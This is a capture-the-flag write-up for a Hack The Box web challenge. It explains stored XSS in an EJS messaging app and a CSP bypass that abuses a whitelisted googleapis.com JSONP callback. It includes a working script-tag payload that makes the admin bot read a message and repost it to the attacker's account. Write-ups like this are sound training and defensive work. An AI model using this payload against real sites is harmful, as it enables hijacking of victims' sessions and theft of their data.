# Massa Gold

| Field | Details |
|-------|---------|
| **Challenge** | Massa Gold |
| **Category** | Web (Stored XSS + CSP bypass) |
| **Difficulty** | Very Easy |
| **Flag** | `HTB{m3554g3_1n_7h3_cu570dy_ch41n_bad9dfb6b21cae512bc17925c6d226b8}` |

---
## Source code (.zip file)
The source code of the files is available in the challenge repository. You can set it up locally using docker to use it as a lab. [Download challenge files](./challenges/web/Massagold.zip) 

## Overview

**Rookery** is a medieval-themed "sealed letters" messaging app. Any registered
user can send a letter to any other username, and — as with every classic
"XSS-to-admin-bot" web challenge — an `admin` account gets visited by a
headless-browser bot the moment it receives new mail. But the twist? Here is a
fairly strict CSP that kills a plain `<script>alert(1)</script>` payload
outright, so the interesting part of this box is finding a way *around* that
CSP rather than finding the XSS itself.

## Recon

The message body is rendered with EJS's raw/unescaped output tag:

```ejs
<!-- app/views/message.ejs -->
<pre class="letter-copy"><%- message.content %></pre>
```

`<%- %>` does **not** HTML-encode its output (`<%= %>` would), so whatever
markup we submit as `content` when composing a letter lands in the page
completely unfiltered — stored XSS, no sanitization anywhere in the chain.

`bot/bot.js` confirms the target: sending a message to a user named `admin`
triggers `enqueueMessageVisit()`, which launches headless Firefox, logs in
with real admin credentials, and opens `/messages/:id` — meaning our payload
runs inside an authenticated admin session.

```js
// app/controllers/messageController.js
if (recipient.username === 'admin') {
  enqueueMessageVisit(result.lastID);
}
```

There's no CSRF protection anywhere in `routes.js`, which matters a lot later:
once our JS is running as `admin`, we can just issue a same-origin
`fetch()` `POST /messages` and the browser will happily attach the admin's
session cookie for us.

## The CSP wall

`server.js` sets:

```
default-src 'self';
script-src 'self' https://www.googleapis.com;
style-src 'self';
img-src 'self' data:;
connect-src 'self';
object-src 'none';
form-action 'self';
frame-ancestors 'none';
```

No `'unsafe-inline'` on `script-src`, so a plain injected `<script>` tag never
executes — the browser refuses to run it, full stop. But `script-src`
explicitly whitelists `https://www.googleapis.com`, and that domain hosts a
legacy JSONP endpoint, `customsearch/v1`, that reflects whatever you put in
its `callback` query parameter **directly into the response body**, with no
validation that it's a real function name:

```
GET https://www.googleapis.com/customsearch/v1?callback=YOUR_CODE_HERE
->
YOUR_CODE_HERE({ ...json error body... });
```

So a script tag like this is both CSP-legal (the src is `googleapis.com`,
which is whitelisted) and same-origin-policy-legal (it's just a `<script src>`
load), and it lets us run arbitrary JS in the victim's page:

```
<script src="https://www.googleapis.com/customsearch/v1?callback=<our JS>"></script>
```

Whatever trails after our code (the `(...)` call against the JSON error
object) either throws harmlessly or, in my payload, gets swallowed by a
trailing `ignored` identifier reference that just quietly errors out after
our real code has already executed — either way it doesn't matter, because
our code has already run by the time that happens.

## My payload

Rather than crawling the admin's whole inbox and regexing out a flag pattern,
I leaned on something I already knew from reading `entrypoint.js` during
recon: message IDs are sequential across the whole app, and the very first
message ever seeded is `archivist → admin` — i.e. `/messages/1` is
deterministically the letter I wanted, no discovery step needed.

So the payload just does two fetches, no loops, no regex, no comparison
operators at all:

> *(screenshot of the payload from VS Code goes here)*
>
> ![vscode payload screenshot](vs_code_messagold.png)

Decoded, it reads:

```
fetch('/messages/1').then(function(r){ return r.text() })
  .then(function(t){
    fetch('/messages', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'to_username=hacker&content=' + encodeURIComponent(t)
    })
  });
```

Two things worth calling out about *why* this version works cleanly, without
needing any extra escaping tricks:

- **No `<` / `>` anywhere.** I used `function(r){...}` instead of arrow
  functions (`r=>`) and never compared anything numerically, so there was
  nothing in the payload for Google's JSONP frontend to mangle. (Other
  solves hit a wall here — Google's endpoint rewrites literal `<`/`>` bytes
  in the reflected callback text, which breaks arrow-function syntax and any
  bare `>=`/`<` comparisons used for crawling/parsing logic.)
- **No parsing needed.** Instead of extracting just the flag substring in
  the browser, I forwarded the *entire raw HTML* of `/messages/1` as the new
  message's content. Since my own inbox renders message content unescaped
  too, opening that mail in my own account re-rendered the whole nested
  page — sealed-letter wrapper and all — directly in the DOM, flag included.

## Steps

**1. Register an account and log in.**

![login page](image1.png)

**2. Compose a letter to `admin`** containing the `<script src="...">` payload
(built by URL-encoding the JS above into the `callback` parameter):

![compose payload with JSONP callback](image2.png)

**3. Wait for the bot.** A few seconds after sending, the admin bot logs in,
opens the letter, and the JSONP-loaded script executes as `admin` — fetching
`/messages/1` and immediately re-posting its content to my account (`hacker`).
Refreshing my inbox shows a new letter has arrived from `admin`:

![received letters, new mail from admin](image3.png)

**4. Open the letter.** Because the forwarded content was the raw HTML of
`/messages/1` (unescaped again on render), the admin's original sealed letter
renders nested inside my copy — and the flag is right there in the DOM:

![opened letter showing the flag in devtools](image4.png)

```
Archive notice: The sealed royal record reads:
HTB{m3554g3_1n_7h3_cu570dy_ch41n_bad9dfb6b21cae512bc17925c6d226b8}
```

## Takeaways

- `<%- %>` in EJS is raw, unescaped output — using it on user-controlled
  content is stored XSS every time. `<%= %>` (HTML-escaped) should be the
  default; raw output needs a specific, deliberate reason.
- A `script-src` allowlist is only as strong as every endpoint on it. Any
  whitelisted domain that reflects attacker input into a script response
  unsanitized — a JSONP callback, an open redirect, a script host with a
  permissive CORS policy — is a full CSP bypass. `googleapis.com`'s legacy
  Custom Search JSONP endpoint is a well-known example of this.
- Once you have code execution as the victim, `connect-src 'self'` doesn't
  save you if the app itself has no CSRF protection — you don't need to
  exfiltrate anywhere external, you can just make the victim's own session
  mail the data to an account you control.
- Sometimes the simplest payload wins: no crawling, no regex, no comparison
  operators to worry about mangling — just target the known first message
  directly and forward the raw response.
  
## Author: [Nene0x00](https://github.com/Nene0x00)
